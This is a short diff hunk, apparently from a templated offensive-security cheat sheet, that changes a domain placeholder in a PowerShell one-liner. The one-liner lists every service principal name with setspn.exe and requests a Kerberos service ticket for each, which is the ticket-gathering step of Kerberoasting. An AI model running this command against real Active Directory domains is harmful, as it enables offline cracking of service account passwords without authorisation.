@@ -16,7 +16,7 @@ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentL
 ```
 
 ```powershell
-setspn.exe -T {{DOMAIN_UPPER}} -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+setspn.exe -T {{DOMAIN}} -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
 ```
 
 ```bash
